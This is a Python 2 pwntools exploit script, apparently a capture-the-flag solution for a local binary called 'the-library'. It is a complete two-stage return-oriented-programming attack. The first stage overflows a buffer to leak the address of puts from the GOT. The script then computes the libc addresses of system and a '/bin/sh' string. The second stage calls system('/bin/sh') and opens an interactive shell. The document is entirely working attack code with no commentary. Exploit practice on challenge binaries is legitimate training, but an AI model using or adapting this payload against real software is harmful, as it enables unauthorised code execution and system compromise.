#!/bin/python

from pwn import *

if __name__ == "__main__":
    libc = ELF('libc.so.6')
    pop_rdi = p64(0x400733)
    plt_put = p64(0x400520)
    got_put = p64(0x601018)
    plt_main = p64(0x400637)

    padding = "A"*24
    payload = padding + pop_rdi + got_put + plt_put + plt_main

    io = process('./the-library')
    io.recvrepeat(2)
    io.sendline(payload)
    io.recvline()
    io.recvline()
    print io.recvline()
    leaked_puts = io.recvline()[-8:].ljust(8, "\x00")
    log.success("Leaked puts: {0}".format(leaked_puts))
    leaked_puts = u64(leaked_puts)


    offset = leaked_puts - libc.symbols['puts']
    sys = p64(offset + libc.symbols['system'])
    sh = p64(offset + 0x1b3e9a)

    payload = p64(0x0000000000400509) + padding + pop_rdi + sh + sys

    io.recvrepeat(2)
    io.sendline(payload)
    io.recvrepeat(2)
    io.interactive()
